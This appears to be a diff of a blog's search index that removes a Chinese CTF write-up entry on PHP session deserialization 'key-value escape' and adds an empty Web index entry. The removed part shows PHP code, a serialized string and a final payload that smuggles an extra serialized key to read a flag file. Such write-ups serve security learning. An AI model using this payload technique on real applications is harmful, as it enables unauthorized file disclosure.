-<p><strong>2.键值逃逸</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;flagflagflagflagflagphp&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>先将自己要写入的代码放进去 也就是$function的值</p>
-<p>-&gt;通过测试，一步步调整 user中的值 来闭合</p>
-</blockquote>
-<p><code>&quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</code></p>
-<p><code>&quot;;s:8:&quot;function&quot;;s:40:&quot;</code> -&gt;这是23的长度，我们传入function中的值，开始要有一个”和; 来闭合前面user的值</p>
-<p><strong>payload:_SESSION[user]&#x3D;flagflagflagflagflagphp&amp;_SESSION[function]&#x3D;”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:1:”1”;s:1:”2”;}</strong></p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BUU-easy_web的Wp</title>
     <url>/CTF/Web/BUU-easy_web/</url>
     <content><![CDATA[<p>打开题目，先抓包看看 -&gt; 两个参数img(base64编码) cmd 图片通过base64编码的格式进行传输.</p>
@@ -401,5 +401,10 @@
       <tags>
         <tag>Web</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Web</title>
+    <url>/CTF/Web/index/</url>
+    <content><![CDATA[]]></content>
   </entry>
 </search>
